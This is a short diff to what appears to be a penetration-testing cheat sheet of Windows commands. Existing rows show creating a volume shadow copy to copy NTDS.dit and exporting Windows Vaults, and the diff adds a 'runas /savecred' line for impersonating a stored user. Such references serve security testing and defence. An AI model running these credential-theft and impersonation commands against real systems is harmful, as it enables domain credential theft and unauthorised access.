@@ -52,6 +52,7 @@
 | `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
 | `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |
 | `rundll32 keymgr.dll,KRShowKeyMgr` | export Windows Vaults to .crd files |
+| `runas /savecred /user:SRV01\mcharles cmd` | use runas to impersonate the stored user |
 
 
 ----
